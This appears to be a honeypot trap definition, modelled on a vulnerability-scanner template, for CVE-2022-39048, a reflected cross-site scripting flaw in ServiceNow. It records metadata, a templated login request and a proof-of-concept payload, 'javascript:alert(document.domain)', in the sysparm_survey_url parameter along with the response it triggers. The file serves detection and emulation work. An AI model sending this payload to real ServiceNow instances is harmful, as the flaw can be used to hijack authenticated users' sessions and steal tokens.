id: CVE-2022-39048
info:
  name: ServiceNow - Cross-site Scripting
  author: theamanrawat
  description: 'A XSS vulnerability was identified in the ServiceNow UI page assessment_redirect.
    To exploit this vulnerability, an attacker would need to persuade an authenticated
    user to click a maliciously crafted URL. Successful exploitation potentially could
    be used to conduct various client-side attacks, including, but not limited to,
    phishing, redirection, theft of CSRF tokens, and use of an authenticated user''s
    browser or session to attack other systems.

    '
  severity: medium
  reference:
  - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1221892
  - https://blog.amanrawat.in/2023/05/05/CVE-2022-39048.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-39048
  - https://support.servicenow.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-39048
    cwe-id: CWE-79
    epss-score: 0.01306
    epss-percentile: 0.8443
    cpe: cpe:2.3:a:servicenow:servicenow:quebec:-:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: servicenow
    product: servicenow
    shodan-query: http.title:"ServiceNow"
  tags: cve,cve2022,xss,servicenow,authenticated
traps:
- request:
    method: GET
    path: /navpage.do
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /login.do
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'sysparm_ck={{csrf}}&user_name={{username}}&user_password={{password}}&not_important=&ni.nolog.user_password=true&ni.noecho.user_name=true&ni.noecho.user_password=true&screensize=1920x1080&sys_action=sysverb_login&sysparm_login_url=welcome.do

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /assessment_redirect.do?sysparm_survey_url=javascript:alert(document.domain)//assessment_take2.do
    headers: {}
    body: ''
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: unwrapped_url = "javascript:alert(document.domain)//assessment_take2.do"assessment_list.do
